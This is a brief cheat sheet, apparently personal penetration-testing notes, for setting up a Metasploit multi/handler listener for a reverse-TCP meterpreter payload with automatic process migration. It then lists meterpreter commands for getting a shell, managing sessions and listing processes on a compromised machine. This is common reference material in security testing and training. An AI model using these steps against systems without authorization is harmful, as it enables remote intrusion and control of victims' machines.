MULTI HANDLER:
    use multi/handler
    set payload <payload>           // es. php/meterpreter/reverse_tcp
    set lhost <ip>
    set lport <port>
    set AutoRunScript post/windows/manage/migrate



METERPRETER COMMANDS:
    sysinfo
    shell       //get shell
    background
    sessions -i 1
    ps

